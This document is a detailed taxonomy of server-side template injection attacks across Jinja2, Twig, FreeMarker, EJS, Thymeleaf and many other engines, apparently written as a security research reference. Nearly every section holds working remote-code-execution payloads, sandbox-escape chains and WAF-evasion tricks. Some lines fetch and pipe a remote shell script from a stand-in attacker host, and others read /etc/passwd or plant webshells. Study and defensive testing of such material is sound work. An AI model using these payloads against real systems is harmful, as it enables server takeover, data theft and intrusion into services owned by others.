# Server-Side Template Injection (SSTI) Mutation/Variation Taxonomy

> **Scope**: All template engines **excluding** EL (Expression Language), OGNL, and SpEL (Spring Expression Language).
> Covers: Jinja2, Twig, FreeMarker, Velocity, Pebble, Thymeleaf, Smarty, Mako, Tornado, ERB, Slim, Razor, Blade, EJS, Handlebars, Nunjucks, Pug, Dust, Go text/template, and others across 8 programming languages.

---

## Classification Structure

This taxonomy organizes the SSTI attack surface along three orthogonal axes:

**Axis 1 — Exploitation Mechanism** (Primary axis, structures the document): The fundamental technique by which an attacker escalates from template syntax injection to code execution. This axis answers *how* the template engine's design or host language is leveraged to execute arbitrary code. Categories range from direct host-language execution to complex multi-step chains involving object introspection, sandbox escapes, and compilation-phase pollution.

**Axis 2 — Filter/Restriction Bypass Technique** (Cross-cutting axis): The evasion method used to circumvent character filters, WAF rules, sandbox policies, or denylist-based defenses. These techniques apply across multiple Axis 1 categories and are the primary differentiator between "known" and "novel" payloads. A single exploitation mechanism may be delivered through dozens of different bypass variations.

**Axis 3 — Deployment Context** (Mapping axis): The architectural environment in which the template engine operates — unsandboxed, sandboxed, framework-integrated, or client-side — which determines the required exploitation chain depth and available attack surface.

### Axis 2 Summary: Filter/Restriction Bypass Types

| Bypass Type | Mechanism | Applicable Engines |
|---|---|---|
| **Character Encoding** | Hex (`\x5f`), Unicode, URL-encoding of restricted characters | Jinja2, FreeMarker, Twig |
| **Alternative Accessor** | `|attr()`, bracket notation, `getlist()`, `|first` | Jinja2, Twig |
| **String Construction** | `|join`, `~` concatenation, `chr()`, `?lower_abc` | Jinja2, Twig, Smarty, FreeMarker |
| **Parameter Smuggling** | `request.args`, `request.headers`, `request.cookies` | Jinja2 (Flask) |
| **Format String Injection** | `%c`, `format()`, string formatting from external inputs | Jinja2, Python engines |
| **Reflection & Indirect Access** | `MethodUtils`, `forName()`, `TYPE` field | Thymeleaf, Pebble, FreeMarker |
| **Template Block Abuse** | `{% with %}`, `{%block%}`, `{%set%}` to restructure evaluation | Jinja2, Twig |
| **Base64/Nested Encoding** | Multi-layer encoding to evade signature-based detection | Cross-engine (WAF bypass) |

### Axis 3 Summary: Deployment Context Types

| Context | Characteristics | Chain Depth | Examples |
|---|---|---|---|
| **Unsandboxed** | No restrictions on code execution | 1 step | ERB, Mako, Blade, Razor, Smarty `{php}` |
| **Sandboxed** | Denylist/allowlist on classes, methods, or built-ins | 2–4 steps | Jinja2 sandbox, FreeMarker `ALLOWS_NOTHING_RESOLVER`, Twig sandbox |
| **Framework-Integrated** | Engine runs within web framework exposing context objects | Variable | Flask+Jinja2, Spring+Thymeleaf, Express+EJS |
| **Client-Side (CSTI)** | Template processed in browser; leads to XSS, not RCE | 1–2 steps | AngularJS, Vue.js client-side rendering |

---

## §1. Direct Host-Language Execution

Template engines that permit direct embedding of host-language code within template delimiters provide the simplest path to code execution. No object traversal or sandbox escape is needed — the template syntax itself includes constructs that evaluate arbitrary code in the server's runtime.

### §1-1. Inline Code Block Execution

These engines provide explicit delimiters for embedding and executing raw code within templates.

| Subtype | Engine (Language) | Mechanism | Example Payload |
|---|---|---|---|
| **Ruby code blocks** | ERB (Ruby) | `<%= %>` and `<% %>` delimiters execute arbitrary Ruby | `<%= system('id') %>` |
| **Ruby Slim blocks** | Slim (Ruby) | `- ` prefix for Ruby code, `= ` for output | `= system('id')` |
| **PHP code blocks** | Smarty < 3 (PHP) | `{php}...{/php}` tags execute PHP directly | `{php}echo system('id');{/php}` |
| **PHP Blade directives** | Blade (PHP/Laravel) | `@php...@endphp` directive pairs | `@php echo system('id'); @endphp` |
| **C# Razor blocks** | Razor (.NET) | `@{ }` and `@expression` syntax execute C# code | `@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }` |
| **Python embedded blocks** | Mako (Python) | `<% %>` blocks execute Python directly | `<% import os; os.system('id') %>` |
| **Python expression tags** | Mako (Python) | `${expression}` evaluates Python expressions | `${__import__('os').popen('id').read()}` |
| **Perl code blocks** | Mojolicious (Perl) | `<%= %>` and `<% %>` execute Perl code | `<%= `id` %>` |

Inline code block execution is the most straightforward SSTI primitive. If the template engine supports it and no sandbox is applied, the attacker's payload is limited only by the capabilities of the host language runtime. The primary defense is to never allow untrusted input to enter template source code.

### §1-2. Module/Import Directive Execution

Some engines allow importing modules or packages within template code, enabling access to system-level functions even when direct code execution delimiters appear restricted.

| Subtype | Engine (Language) | Mechanism | Example Payload |
|---|---|---|---|
| **Python import in template** | Tornado (Python) | `{% import module %}` within template blocks | `{% import os %}{{ os.popen('id').read() }}` |
| **Mako module import** | Mako (Python) | `<%! %>` for module-level blocks, `<% %>` for in-line | `<% import subprocess; x=subprocess.check_output('id',shell=True) %>${x}` |
| **Jinja2 namespace import** | Jinja2 (Python) | When extensions like `jinja2.ext.do` are loaded | `{% set x = cycler.__init__.__globals__.os.popen('id').read() %}` |

### §1-3. File Operation Primitives

Several engines provide direct file I/O functions within the template syntax, enabling arbitrary file read/write without full code execution.

| Subtype | Engine (Language) | Mechanism | Example Payload |
|---|---|---|---|
| **Smarty file write** | Smarty (PHP) | `Smarty_Internal_Write_File::writeFile()` static method | Write a PHP webshell to the webroot |
| **ERB file read** | ERB (Ruby) | Ruby's `File.read()` within `<%= %>` | `<%= File.read('/etc/passwd') %>` |
| **Go method-based file read** | Go text/template | Calling exported methods on passed structs | `{{ .GetFile "/etc/passwd" }}` |

---

## §2. Object Introspection & Class Hierarchy Traversal

When direct code execution is unavailable, attackers exploit the host language's object model to walk inheritance hierarchies, discover loaded classes, and reach dangerous methods. This is the most common and versatile SSTI exploitation category, accounting for 16 of 34 studied template engines.

### §2-1. Python MRO (Method Resolution Order) Chain

Python's rich introspection capabilities make it the most fertile ground for object-hierarchy SSTI attacks. The fundamental technique uses `__mro__` or `mro()` to climb the inheritance tree to `object`, then `__subclasses__()` to descend and enumerate all classes loaded in the current Python process.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **Basic MRO traversal** | `''.__class__.__mro__[1].__subclasses__()` enumerates all loaded classes | Any Python object in template context | `{{ ''.__class__.__mro__[1].__subclasses__() }}` |
| **Popen discovery** | Iterate subclasses to find `subprocess.Popen` at a specific index | `subprocess` module loaded | `{{ ''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate() }}` |
| **FileIO discovery** | Locate `_io.FileIO` or `_io._RawIOBase` subclasses for file read | `_io` module loaded | `{{ ''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read() }}` |
| **Config object traversal** | Access Flask `config` object's `__init__.__globals__` for `os` module | Flask application context | `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` |
| **Cycler/Joiner globals** | Use Jinja2 built-in objects' `__init__.__globals__` to reach `os` | Jinja2 built-in objects available | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |
| **Lipsum globals** | Abuse Jinja2's `lipsum` function's globals chain | `lipsum` available in context | `{{ lipsum.__globals__['os'].popen('id').read() }}` |
| **Namespace traversal** | Use `namespace.__init__.__globals__` | Jinja2 namespace object available | `{{ namespace.__init__.__globals__.os.popen('id').read() }}` |

The key insight is that **any Python object** reachable from the template context can serve as a starting point for MRO traversal. The attacker's challenge is finding the correct index in `__subclasses__()` for the target class, which varies between applications and Python versions. Automated tools solve this by iterating all subclasses.

### §2-2. JavaScript Constructor Chain

In JavaScript template engines (Node.js), the exploitation mirrors Python's MRO but uses the prototype chain and `constructor` property. Since every function's `constructor` points to `Function`, attackers can create arbitrary functions from string bodies.

| Subtype | Engine | Mechanism | Example |
|---|---|---|---|
| **Range constructor** | Nunjucks | `range.constructor` is `Function`, allowing code eval from string | `{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}` |
| **Cycler constructor** | Nunjucks | Alternative to range; same `Function` constructor access | `{{ cycler.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}` |
| **String constructor chain** | Handlebars, Pug, EJS, JsRender | `''.constructor.constructor` yields `Function` | `${ ''.toString.constructor.call({},"return global.process.mainModule.require('child_process').execSync('id')")() }` |
| **Nested helper abuse** | Handlebars | Chain `#with`, `split`, `push`, `pop` helpers to build code execution | `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}...{{/with}}{{/with}}{{/with}}` |
| **Template7 js helper** | Template7 | Built-in `js` helper evaluates JavaScript | `{{js "global.process.mainModule.require('child_process').execSync('id')"}}` |
| **Marko out expression** | Marko | `${expression}` evaluates arbitrary JS | `${require('child_process').execSync('id')}` |

### §2-3. Java Reflection Chain

Java template engines are exploited through reflection — accessing `getClass()`, then `forName()` to reach `java.lang.Runtime` or `java.lang.ProcessBuilder` for command execution.

| Subtype | Engine | Mechanism | Example |
|---|---|---|---|
| **Direct getClass chain** | Pebble (< 3.0.9) | `variable.getClass().forName(...)` traversal | `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}` |
| **TYPE field bypass** | Pebble (>= 3.0.9) | Java wrapper `TYPE` field (`(1).TYPE`) provides `Class` without `getClass()` | Via `java.lang.Integer.TYPE` → `Class` access |
| **Velocity ClassTool** | Velocity | `$class.inspect()` and `$class.type` obtain arbitrary class references | `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")` |
| **Jinjava reflection** | Jinjava | Python-like introspection adapted to Java's object model | Introspective chain similar to Python |
| **Spring bean access** | Pebble + Spring | Exposed Spring beans provide object graph leading to unrestricted APIs | Bean traversal → ClassLoader → arbitrary class instantiation |

---

## §3. Dangerous Built-in Functions & Type Constructors

Many template engines provide built-in functions or type-creation mechanisms that were designed for legitimate template operations but can be weaponized for code execution.

### §3-1. FreeMarker Built-in Exploitation

FreeMarker provides several built-in functions that enable code execution when not properly restricted.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **`?new` instantiation** | Creates instances of `TemplateModel` implementations, including `freemarker.template.utility.Execute` | `TemplateClassResolver` not set to `ALLOWS_NOTHING_RESOLVER` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **`?api` Java API access** | Exposes underlying Java API of BeanWrappers, enabling reflection | `setAPIBuiltinEnabled(true)` in configuration | Access to `java.lang.Class`, `ClassLoader`, and arbitrary method invocation |
| **`?lower_abc` / `?upper_abc` character encoding** | Converts numbers to alphabet characters, enabling filter bypass | FreeMarker expression context | `6?lower_abc` → `"f"`, enabling character-by-character payload construction |
| **`ObjectConstructor` instantiation** | Direct object creation via built-in `ObjectConstructor` | `UNRESTRICTED_RESOLVER` or `SAFER_RESOLVER` not blocking it | `<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder","id").start()}` |
| **`JythonRuntime` execution** | Execute Jython (Python-on-JVM) code within FreeMarker | Jython available on classpath, resolver not blocking | `<#assign jr="freemarker.template.utility.JythonRuntime"?new()><@jr>import os; os.system("id")</@jr>` |
| **`assign` + `include` chain** | Assign data model variables then include attacker-controlled resources | Template directive injection | `<#assign x="freemarker.template.utility.Execute"?new()>${x("curl attacker.com/shell.sh | bash")}` |

### §3-2. Twig Built-in Exploitation

Twig (PHP) provides a more restricted default environment, but several built-in features can be chained for code execution.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **`_self` environment access** | `_self.env` accesses the Twig Environment object, enabling method calls | Twig < 2.x (deprecated in later versions) | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
| **`filter()` callback registration** | Register arbitrary PHP functions as Twig filter callbacks | Access to environment object or `getFilter()` | Register `system` as callback, then call via filter |
| **Block/charset gadget** | Abuse `{%block%}` and `_charset` built-in for command construction | Twig rendering context | `{%block U%}id000passthru{%endblock%}{%set x=block(_charset\|first)\|split(000)%}{{ [x\|first]\|map(x\|last)\|join }}` |
| **`_context` variable abuse** | `_context` provides access to all template variables; combined with `slice`, `split`, `map` for code construction | Double-rendering or access to `_context` | `{{ id~passthru~_context\|join\|slice(2,2)\|split(000)\|map(_context\|join\|slice(5,8)) }}` |
| **`sort` / `map` filter with callback** | Twig's array filters accept callable arguments | PHP function accessible | `{{ ['id']\|sort('system') }}` or `{{ ['id']\|map('system') }}` |
| **`evaluate_twig()` nested call** | Bypasses regex-based sanitization via nested Twig evaluation | Grav CMS or similar frameworks exposing `evaluate_twig` | Nested calls evade `cleanDangerousTwig` validation |

### §3-3. Smarty Built-in Exploitation

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **`{if}` tag code execution** | Smarty's `{if}` evaluates PHP expressions | Smarty security policy not restricting `{if}` | `{if system('id')}{/if}` |
| **Static class access** | `Smarty_Internal_Write_File` and other static classes accessible | Static class not restricted | File write to create webshell |
| **`chr()` + `cat` construction** | `chr()` generates characters, `cat` modifier concatenates | Smarty function access | `{chr(105)\|cat:chr(100)}` → `"id"` → pass to `passthru()` |
| **`{fetch}` URL access** | Fetch remote content via built-in `{fetch}` function | `{fetch}` not disabled in security policy | `{fetch file="http://attacker.com/shell.txt"}` |

### §3-4. Go Template Method Invocation

Go's template engines present a unique exploitation model: there are no intrinsic dangerous functions, but any **exported method** on objects passed to the template is callable.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **Exposed method call** | Call public methods on struct passed to `Execute()` | Target struct has methods with dangerous side effects | `{{ .ExecuteCmd "id" }}` or `{{ .GetFile "/etc/passwd" }}` |
| **Method confusion** | Exploit method name collisions or unexpected method accessibility in deep object graphs | Complex struct hierarchies passed to templates | Enumerate accessible methods via `{{ . }}` |
| **`call` built-in (text/template)** | `text/template`'s `call` function invokes any function value | Function-type field in template data | `{{ call .DangerousFunc "arg" }}` |

---

## §4. Sandbox Escape Techniques

When template engines implement security sandboxes, attackers must find indirect paths to code execution. Sandbox escapes represent the most technically sophisticated SSTI attacks and are often engine- or application-specific.

### §4-1. FreeMarker Sandbox Bypass

FreeMarker's sandbox is controlled by `TemplateClassResolver` configuration. Even with `ALLOWS_NOTHING_RESOLVER`, several bypass paths exist.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **`?api` + ClassLoader chain** | `?api` built-in accesses Java API; `getProtectionDomain().getClassLoader()` obtains ClassLoader | `setAPIBuiltinEnabled(true)` and FreeMarker < 2.3.30 | ClassLoader → load arbitrary class → instantiate `Execute` |
| **`getResourceAsStream` file read** | ClassLoader's `getResourceAsStream()` reads classpath and filesystem resources | ClassLoader accessible via `?api` | Read via `file://`, `http://`, `ftp://` URI schemes (SSRF) |
| **Application utility class abuse** | Leverage application-specific classes exposed to templates (e.g., OFBiz's `GroovyUtil.eval()`) | Application exposes utility classes via `Static` hash | `${Static["org.apache.ofbiz.base.util.GroovyUtil"].eval("['id'].execute().text")}` (CVE-2024-48962) |
| **Gson deserialization gadget** | Use Gson's `fromJson()` to deserialize `freemarker.template.utility.Execute` from JSON | Gson on classpath, ClassLoader accessible | Load Gson → `fromJson()` → instantiate `Execute` → RCE |
| **Version-specific bypasses** | FreeMarker < 2.3.30: `ProtectionDomain.getClassLoader` unrestricted | Specific FreeMarker version | Direct ClassLoader access without `?api` |

### §4-2. Twig Sandbox Bypass

Twig's sandbox restricts allowed tags, filters, methods, and properties through a `SecurityPolicy`. Bypasses target the gap between policy enforcement and the objects accessible in the template context.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **Runtime configuration modification** | Modify `system.twig.safe_functions` / `safe_filters` via `grav.twig.twig_vars['config']` to whitelist dangerous functions | Grav CMS with editor access (CVE-2024-28116) | Step 1: add `system` to safe_functions. Step 2: `{{ system('id') }}` |
| **`_self.env` method calls** | Access Twig Environment methods via `_self` reference | Twig 1.x (deprecated in 2.x) | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
| **Regex sanitization bypass** | Nested `evaluate_twig()` calls bypass weak regex-based `cleanDangerousTwig` | Grav CMS (CVE-2025-66294) | Nested Twig directives evade single-pass regex |
| **Extension class access** | Access Twig extension classes to redefine config variables | Template has access to extension objects | Redefine variables to enable dangerous functions |

### §4-3. Thymeleaf Sandbox Bypass

Thymeleaf implements modern defenses including denylist-based package restrictions (`java.`, `javax.`, `org.springframework.util.`), instantiation blocking, and static class access prevention.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **Preprocessing double evaluation** | `__${expr}__` preprocessing evaluates content between double underscores before the main expression | User input reflected in preprocessing context | `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::x` |
| **Third-party library reflection** | Use `org.apache.commons.lang3.reflect.MethodUtils` (not on denylist) for reflection calls | commons-lang3 on classpath (common in Spring Boot) | `MethodUtils.invokeStaticMethod(forName("java.lang.Runtime"), "getRuntime")` → `exec()` |
| **Spring context variable access** | Access Spring request/response objects through context variables to exfiltrate output | Spring MVC integration | Output via response objects without external connections |
| **Denylist gaps** | Third-party libraries and application-specific classes not covered by default denylist | Additional libraries in classpath | Any utility class with `exec()` or `invoke()` capabilities |

### §4-4. Pebble Sandbox Bypass

Pebble restricts access to `getClass()` and other dangerous methods. Bypasses leverage Java's type system and framework integration.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **Case-insensitive method bypass** | Pebble < 3.0.9 checked `getClass` case-sensitively | Pebble < 3.0.9 | `{{ variable.GetClass().forName(...) }}` |
| **Java wrapper TYPE field** | `java.lang.Integer.TYPE` (and similar) provides `Class` object without `getClass()` | Any Java wrapper type accessible | `{{ (1).TYPE }}` → `java.lang.Class` → reflection chain |
| **Spring bean object graph** | Traverse exposed Spring beans to find objects with ClassLoader or `exec()` access | Spring integration with beans exposed to templates | Deep inspection of bean object graphs for dangerous methods |
| **Module-based forName** | `java.lang.Class.forName(java.lang.Module, java.lang.String)` signature bypasses method restrictions | Java 9+ module system | Alternative `forName` overload not covered by denylist |

### §4-5. Jinja2 Sandbox Escape

Jinja2's `SandboxedEnvironment` restricts attribute access and method calls. Escapes rely on reaching objects from the non-sandboxed environment.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **Explicitly passed objects** | Objects passed to `render_template()` may have unrestricted method access | Developer passes objects with dangerous methods | Abuse application-specific objects' methods |
| **`__globals__` via allowed objects** | Even in sandbox, if an allowed object's `__init__.__globals__` chain reaches `os`, execution is possible | Sandbox doesn't block `__globals__` traversal on allowed objects | `{{ allowed_obj.__init__.__globals__['os'].popen('id').read() }}` |
| **Format string escape** | `format_map()` or `format()` on string objects to access globals | Sandbox allows string formatting | String format specifiers to leak or access restricted objects |

---

## §5. Prototype & Compilation-Phase Pollution

In JavaScript (Node.js) environments, template engines can be compromised not through direct template syntax injection but by polluting the JavaScript object prototype or the template compilation pipeline itself.

### §5-1. EJS Compilation Pollution

EJS compiles templates into JavaScript functions. Prototype pollution can inject code into the compilation output.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **`outputFunctionName` pollution** | Pollute `Object.prototype.outputFunctionName` with JS code; EJS concatenates it into compiled function | Server-side prototype pollution + EJS rendering | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').exec('id');//"}}` |
| **`escapeFunction` pollution** | Pollute `opts.escapeFunction`; when `opts.client` is truthy, EJS reflects it unsanitized into compiled code | Prototype pollution + `client` flag | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify;process.mainModule.require('child_process').exec('id')"}}` |
| **`destructuredLocals` pollution** | Pollute array-like properties to inject destructuring patterns into compiled output | EJS version with destructured locals support | Inject malicious variable names in destructuring |
| **`settings.view options` chain** | Express provides default config that flows into EJS options, creating pollution paths | Express + EJS default configuration | Express's default settings make applications "vulnerable by default" |

### §5-2. Other Node.js Engine Pollution

| Subtype | Engine | Mechanism | Example |
|---|---|---|---|
| **Pug options pollution** | Pug | Pollute compiler options to inject code during template compilation | `{"__proto__":{"block":{"type":"Text","val":"...child_process..."}}}` |
| **Handlebars helper pollution** | Handlebars | Pollute prototype to register malicious helpers or modify compilation | `__lookupGetter__` and `__defineGetter__` abuse |
| **`constructor.constructor` chain** | Multiple engines | Even without direct pollution, `constructor.constructor` reaches `Function` for eval | `{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}` |

---

## §6. Preprocessing & Double Evaluation

Some template engines implement multi-phase template processing where expressions are evaluated in stages. Injecting into an earlier processing phase can bypass defenses applied at later phases.

### §6-1. Thymeleaf Preprocessing Injection

Thymeleaf's expression preprocessing evaluates content between `__...__` markers before the main expression evaluation pass.

| Subtype | Mechanism | Key Condition | Example |
|---|---|---|---|
| **URL parameter preprocessing** | User input in `@{...}` URL expressions with `__${input}__` preprocessing | Input reflected in `th:href` or similar URL attributes | `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x` |
| **Fragment expression preprocessing** | Input used in fragment selectors `~{template :: __${input}__}` | Dynamic fragment resolution | Inject expressions evaluated during preprocessing |
| **Attribute preprocessing** | Input in `th:text`, `th:value`, or other attributes with preprocessing | Double-underscore markers in template attribute values | `__${expression}__` evaluated before the outer expression |

### §6-2. Multi-Pass Template Rendering

| Subtype | Engine | Mechanism | Example |
|---|---|---|---|
| **Twig double render** | Twig | Template output is re-processed through Twig (e.g., CMS rendering user content as template) | First pass inserts payload, second pass executes |
| **Jinja2 `from_string`** | Jinja2 | Application uses `Environment.from_string()` on user input, creating direct template execution | `from_string()` treats input as template source code |
| **FreeMarker `?interpret`** | FreeMarker | `?interpret` evaluates a string as a FreeMarker template at runtime | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` within interpreted string |
| **Recursive include/import** | Multiple | Templates include other templates that contain user-controlled content | Included template inherits the full template context |

---

## §7. Detection & Identification Techniques

Template engine identification is a critical prerequisite for exploitation. Different engines respond differently to the same polyglot probes.

### §7-1. Polyglot-Based Detection

| Subtype | Mechanism | Example Probe |
|---|---|---|
| **Universal error polyglot** | A single string that triggers errors in all 44 major template engines | `<%'${{/#{@}}%>{{` (16 characters) |
| **Arithmetic evaluation probe** | Mathematical expressions that render results in vulnerable engines | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` |
| **String multiplication probe** | Distinguish engines by how they handle string multiplication | `{{7*'7'}}` → Jinja2: `7777777`, Twig: `49` |
| **Non-error polyglots** | Three probes that collectively render modified (not error) output for all 44 engines | Polyglots from Template Injection Table research |
| **Error message fingerprinting** | Trigger engine-specific error messages to identify the engine | Invalid syntax targeting each engine's parser |

### §7-2. Behavioral Fingerprinting

| Subtype | Mechanism | Distinguishing Signal |
|---|---|---|
| **Delimiter-based identification** | Test different delimiter styles: `{{ }}`, `<% %>`, `${ }`, `#{ }`, `{% %}` | Which delimiters cause evaluation vs. literal output |
| **Built-in object probing** | Probe for engine-specific objects: `self`, `_self`, `this`, `request`, `env` | Object existence confirms specific engine |
| **Filter/function availability** | Test engine-specific filters: `|attr`, `?api`, `|sort`, `|map` | Filter existence narrows engine identity |
| **Comment syntax testing** | Test comment delimiters: `{# #}`, `<%-- --%>`, `{{!-- --}}` | Comment rendering behavior |
| **DNS/time-based blind detection** | Use `sleep()`, DNS lookups, or HTTP callbacks for blind SSTI | Out-of-band signals confirm template evaluation |

---

## §8. Filter & WAF Bypass Techniques (Detailed)

This section expands the Axis 2 cross-cutting bypass types with concrete techniques organized by restriction type.

### §8-1. Character Restriction Bypasses

When specific characters are filtered (underscores, dots, brackets, quotes, etc.), template engines' own features provide alternative access paths.

| Restricted Character | Bypass Technique | Engine | Example |
|---|---|---|---|
| `_` (underscore) | Hex encoding `\x5f` | Jinja2 | `request\|attr('\x5f\x5fclass\x5f\x5f')` |
| `_` (underscore) | `request.args` parameter smuggling | Jinja2 (Flask) | `request\|attr(request.args.x)` with `?x=__class__` |
| `.` (dot) | Bracket notation `[]` | Jinja2 | `request['__class__']` |
| `.` (dot) | `|attr()` filter | Jinja2 | `request\|attr('__class__')` |
| `[]` (brackets) | `|attr()` filter | Jinja2 | `request\|attr('__class__')` |
| `'` and `"` (quotes) | `chr()` function composition | Smarty | `{chr(105)\|cat:chr(100)}` → `"id"` |
| `'` and `"` (quotes) | `request.args` | Jinja2 (Flask) | Values from query string don't need in-template quotes |
| `'` and `"` (quotes) | `?lower_abc` number-to-char | FreeMarker | `6?lower_abc` → `"f"` |
| `{{ }}` (delimiters) | `{% %}` block syntax | Jinja2 | `{% if condition %}...{% endif %}` for blind injection |
| `{{ }}` (delimiters) | `{% with %}` blocks | Jinja2 | `{% with a=request['application']['__globals__'] %}{{ a }}{% endwith %}` |
| Keywords (`os`, `system`) | String concatenation | Jinja2 | `['o','s']\|join` or `request.args` smuggling |
| Keywords | `?lower_abc` char building | FreeMarker | Build keyword character by character |
| `__class__` etc. | `|join` filter concatenation | Jinja2 | `request\|attr(["__","class","__"]\|join)` |
| General characters | `getlist()` list construction | Jinja2 (Flask) | `request.args.getlist('x')` to build lists without `[]` |
| General characters | `query_string` decoding | Jinja2 (Flask) | `request.query_string[2:16].decode()` |

### §8-2. Payload Obfuscation Techniques

| Technique | Purpose | Engine/Context | Example |
|---|---|---|---|
| **Base64 encoding** | Evade signature-based WAF rules | Multiple (esp. Java engines) | Nested base64 encoding of payload components |
| **Character concatenation** | Bypass keyword filters | Java engines (Velocity) | `Character.toString(99).concat(Character.toString(97))...` → `"cat"` |
| **ASCII value construction** | Bypass string literal filters | Smarty, FreeMarker | `chr()` / `?lower_abc` character-by-character |
| **Unicode normalization** | Evade character-level filters | Multiple | Unicode equivalents of restricted characters |
| **Whitespace manipulation** | Break WAF regex patterns | Multiple | Tabs, newlines, zero-width spaces between tokens |
| **Comment injection** | Break keyword signatures | Twig, Smarty | `{# comment #}` between parts of sensitive keywords |
| **Variable indirection** | Avoid sensitive strings in payload | Jinja2, Twig | Store payload parts in variables via `{% set %}` |

### §8-3. Context-Aware Delivery Techniques

| Technique | Mechanism | Example |
|---|---|---|
| **HTTP header smuggling** | Deliver payload parts via HTTP headers, access via `request.headers` | `request\|attr(request.headers.x)` with header `X: __class__` |
| **Cookie-based delivery** | Store payload components in cookies, access via `request.cookies` | `request\|attr(request.cookies.x)` |
| **Multi-parameter split** | Split payload across multiple GET/POST parameters, reassemble in template | Each `request.args.paramN` carries a fragment |
| **Content-Type confusion** | Use unexpected Content-Type to bypass WAF body parsing | JSON body with template syntax when WAF expects form data |
| **Path-based injection** | Inject via URL path segments, access via `request.path` | Template injection in routing parameters |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Impact |
|---|---|---|---|
| **Unsandboxed RCE** | Template engine with no restrictions, user input in template source | §1 (Direct Execution) | Full system compromise |
| **Sandboxed RCE** | Template engine with sandbox, requires escape chain | §4 (Sandbox Escape) + §2 (Introspection) | Full system compromise |
| **CMS Template Editing** | CMS allows users to edit templates (Grav, Craft, WordPress) | §3 (Built-in Abuse) + §4 (Sandbox Escape) | Site takeover, lateral movement |
| **Filtered/WAF-Protected** | Input filters or WAF block common payloads | §8 (Bypass Techniques) + §2/§3 | RCE if bypass succeeds |
| **Prototype Pollution → SSTI** | SSPP vulnerability chains into template engine | §5 (Compilation Pollution) | RCE via indirect template compromise |
| **Blind SSTI** | No output reflection; requires out-of-band exfiltration | §7-2 (Blind Detection) + any §2-§4 | Data exfiltration, RCE via callback |
| **SSRF via Template** | Template engine fetches remote resources or accesses internal APIs | §3-1 (FreeMarker `getResourceAsStream`), §1-3 | Internal service access, cloud metadata |
| **File Read/Write** | Template provides file I/O primitives or traversal | §1-3, §4-1 (ClassLoader resources) | Source code disclosure, webshell creation |
| **Client-Side Template Injection (CSTI)** | Client-side framework processes user input as template in browser | AngularJS `{{constructor...}}`, Vue.js `constructor` | XSS, DOM manipulation (not RCE) |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Product | Impact / Bounty |
|---|---|---|---|
| §4-2 (Twig sandbox bypass) + §3-2 (built-in abuse) | CVE-2024-28116 | Grav CMS < 1.7.45 | Authenticated RCE. Runtime config modification to whitelist `system()` |
| §4-2 (Twig sandbox regex bypass) | CVE-2025-66294 | Grav CMS < 1.8.0-beta.27 | Authenticated RCE via nested `evaluate_twig()` bypassing regex sanitization |
| §3-2 (Twig built-in) + §6-2 (CMS double render) | CVE-2025-32432 | Craft CMS 3.x–5.x | **Unauthenticated RCE (CVSS 10.0)**. ~13,000 vulnerable instances, ~300 compromised. Metasploit module available |
| §4-1 (FreeMarker sandbox bypass) + §3-1 (`?api`) | CVE-2023-49964 | Alfresco | Authenticated RCE via ClassLoader chain through `?api` built-in |
| §4-1 (FreeMarker application utility abuse) | CVE-2024-48962 | Apache OFBiz < 18.12.17 | Unauthenticated RCE via `GroovyUtil.eval()` through FreeMarker `Static` hash |
| §3-1 (FreeMarker `?new`) | CVE-2016-4462 | Apache OFBiz 13.07.03 | RCE via `Execute` class instantiation |
| §4-3 (Thymeleaf denylist gap) | Reported 2024 | Spring Boot 3.3.4 | RCE via `MethodUtils` (commons-lang3) bypassing Thymeleaf's package denylist |
| §4-4 (Pebble sandbox bypass) | GHSL-2020-050 | Pebble Templates | RCE via `getClass()` case-sensitivity bypass (< 3.0.9) |
| §5-1 (EJS compilation pollution) | CVE-2022-29078 | EJS | RCE via `opts.settings['view options']` pollution |
| §5-1 (EJS `outputFunctionName`) | CVE-2024-33883 | EJS < 3.1.10 | RCE via prototype pollution → `outputFunctionName` injection |
| §1-1 (Direct PHP execution) | CVE-2024-22722 | Form Tools 3.1.1 | RCE via template injection in Group Name field |
| §3-1 (FreeMarker) | CVE-2024-41667 | OpenAM <= 15.0.3 | RCE via FreeMarker template injection |
| §2-1 (MRO traversal) | CVE-2024-28118 | Grav CMS (Twig + Python-like) | RCE via unrestricted Twig extension class access |
| §7-1 + §2-1 | Bug Bounty | Undisclosed | $1,200 bounty for `{{6*200}}` SSTI leading to RCE |
